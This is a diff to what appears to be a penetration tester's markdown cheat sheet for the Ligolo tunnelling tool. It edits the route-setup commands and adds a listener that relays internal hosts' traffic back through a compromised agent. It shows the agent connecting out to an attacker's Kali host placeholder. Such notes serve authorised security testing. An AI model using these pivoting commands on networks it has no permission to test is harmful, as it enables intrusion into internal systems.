@@ -59,8 +59,6 @@ agent.exe -connect <KALI-IP>:11601 -accept-fingerprint <FINGERPRINT>
 agent.exe -connect <KALI-IP>:11601 -ignore-cert
 ```
 
-# Ligolo Console
-
 ## Select the session
 ```bash
 session
@@ -75,13 +73,18 @@ ifconfig
 
 ## Add the route
 ```bash
-interface_add_route --name ligolo --route <subnet from ifconfig>
+sudo ip route add <subnet from ifconfig> dev ligolo
 ```
 
 ## Access the current agent localhost with Ligolo
 Ligolo maps `240.0.0.0/4` to the current agent `127.0.0.1`.
 ```bash
 sudo ip route add 240.0.0.1/32 dev ligolo
+```
+
+## Add a listener for internal hosts to reach proxy through agent
+```
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
 ```
 
 # Kali
